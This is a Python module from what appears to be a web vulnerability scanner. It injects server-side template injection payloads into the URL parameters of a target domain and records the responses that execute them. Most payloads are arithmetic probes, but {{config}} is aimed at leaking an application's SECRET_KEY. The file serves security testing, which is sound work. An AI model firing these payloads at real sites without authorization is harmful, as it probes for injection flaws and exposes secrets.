"""
modules/ssti.py
---------------
Server-Side Template Injection (Jinja2, Twig, Freemarker, Velocity, Mako, Smarty).
Uses polyglot payloads + arithmetic verification.
"""

import re
from typing import List, Dict, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.logger import get_logger, info, ok, warn
from core.utils import safe_request, write_lines
from modules._common import load_urls, module_dir, save_finding, cli_main

log = get_logger("ssti")


# Polyglot payloads and their expected arithmetic outputs
PAYLOADS = [
    ("{{7*7}}", "49", "jinja2/twig"),
    ("${7*7}", "49", "freemarker/spring"),
    ("<%= 7*7 %>", "49", "erb"),
    ("#{7*7}", "49", "ruby"),
    ("{7*7}", "49", "smarty"),
    ("{{7*'7'}}", "7777777", "jinja2"),
    ("${7*'7'}", "7777777", "freemarker"),
    ("{{7*7}}${7*7}", "4949", "polyglot"),
    ("{{config}}", "SECRET_KEY", "jinja2-config"),
    ("{{''.__class__}}", "class", "jinja2-attr"),
    ("${{<%[%'\"}}%\\", "template", "fuzz"),
]


def test_url(url: str) -> List[Dict]:
    findings: List[Dict] = []
    p = urlparse(url)
    qs = parse_qs(p.query)
    if not qs:
        return []

    for param in qs:
        for payload, expected, engine in PAYLOADS:
            try:
                new_qs = dict(qs)
                new_qs[param] = [payload]
                new_url = urlunparse((p.scheme, p.netloc, p.path,
                                      p.params, urlencode(new_qs, doseq=True), ""))
            except Exception:
                continue
            r = safe_request(new_url, timeout=10)
            if not r:
                continue
            text = r.text or ""
            if expected in text and payload not in text:
                findings.append({
                    "type": "ssti",
                    "url": new_url,
                    "param": param,
                    "payload": payload,
                    "engine": engine,
                    "evidence": f"Expected '{expected}' found in response",
                    "severity": "critical",
                    "confidence": 85,
                })
                break
    return findings


def run(domain: str, output_root: str = "results",
        scan_id: Optional[int] = None) -> Dict:
    mdir = module_dir(domain, "ssti", output_root)
    urls = load_urls(domain, output_root)
    params_urls = [u for u in urls if "?" in u and "=" in u]

    if not params_urls:
        return {"count": 0, "findings": []}

    info(f"Testing {len(params_urls)} URLs for SSTI")
    findings: List[Dict] = []

    for url in params_urls[:120]:
        try:
            for f in test_url(url):
                findings.append(f)
                save_finding(domain, "ssti", "ssti", "critical",
                             f["url"], param=f["param"], payload=f["payload"],
                             evidence=f["evidence"], confidence=f["confidence"],
                             scan_id=scan_id, output_root=output_root)
                warn(f"SSTI: {f['url']} ({f['engine']})")
        except Exception as e:
            log.debug(f"ssti test failed: {e}")

    if findings:
        write_lines(mdir / "ssti_findings.txt",
                    [f"[CRITICAL] {f['engine']} {f['url']}" for f in findings])

    return {"count": len(findings), "findings": findings}


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("-t", "--target", required=True)
    p.add_argument("-o", "--output", default="results")
    args = p.parse_args()
    cli_main(args.target, "ssti", run, args.output)